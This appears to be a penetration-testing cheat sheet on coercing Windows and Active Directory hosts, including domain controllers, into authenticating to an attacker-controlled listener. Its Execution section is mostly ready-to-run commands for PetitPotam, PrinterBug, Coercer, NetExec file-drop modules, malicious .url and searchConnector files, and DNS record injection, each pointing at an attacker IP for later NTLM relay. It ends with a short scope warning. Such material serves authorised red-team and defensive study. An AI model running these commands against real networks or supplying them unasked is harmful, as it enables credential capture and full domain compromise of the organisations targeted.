# Authentication Coercion

Coercion removes the wait. Instead of hoping a user mistypes a share name, you call an RPC method or plant a file that makes the target authenticate to you immediately. PetitPotam, PrinterBug and DFSCoerce are the well-known triggers.

## Why It Works

Several RPC interfaces accept a UNC path as a parameter and will happily connect to it using the machine account, with no check on where that path points. A domain controller coerced this way authenticates as a Domain Controllers group member.

## Prerequisites

* Reachable RPC or WebDAV services on the target
* Some triggers work unauthenticated; others need any valid domain credential

## Execution

**Coerce**

* **→ Unauthenticated PetitPotam (CVE-2022-26925)**
  * `petitpotam.py -d <domain> <listener> <target>` [\[tool\]](https://github.com/topotam/PetitPotam)
    * **→ Coerce SMB**

**Coerce**

* Drop file
  * .lnk
    * `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * .scf
    * `nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * .url
    * `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
  * Other files
    * `ntlm_theft.py -g all -s <your_ip> -f test` [\[tool\]](https://github.com/Greenwolf/ntlm_theft)
* Webdav
  * Enable webclient
    * .searchConnector-ms
      * `nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * add attack computer in dns
    * `dnstool.py -u <domain>\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>` [\[tool\]](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
  * `Launch coerce with <attacker_hostname>@80/x as target`
    * **→ HTTP Coerce**
* RPC call
  * `printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>` [\[tool\]](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
  * `petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>` [\[tool\]](https://github.com/topotam/PetitPotam)
    * **→ SMB NTLM Coerce**
  * `coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>` [\[tool\]](https://github.com/p0dalirius/Coercer)
* Coerce kerberos
  * `dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp` [\[tool\]](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
    * `petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>` [\[tool\]](https://github.com/topotam/PetitPotam)
      * **→ SMB Kerberos coerce**

**Webdav**

* `open file <file>.searchConnector-ms`
  * `dnstool.py -u <domain>\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>` [\[tool\]](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
    * `petitpotam.py -u '<user>' -p <pass> -d '<domain>' "attacker@80/random.txt" <ip>` [\[tool\]](https://github.com/topotam/PetitPotam)
      * **→ HTTP Coerce**

{% hint style="warning" %}
Coercing a domain controller and relaying it is a full-domain-compromise chain. Confirm it is in scope before firing it — and note that some triggers crash the spooler service on older builds.
{% endhint %}

## Related

* [NTLM Relay](file:///9685693/coercion-relay/ntlm-relay.md) — where the coerced authentication should be sent
* [Web Enrollment Relay (ESC8)](file:///9685693/adcs/web-enrollment-relay-esc8.md) — coercion plus ADCS relay is the classic chain
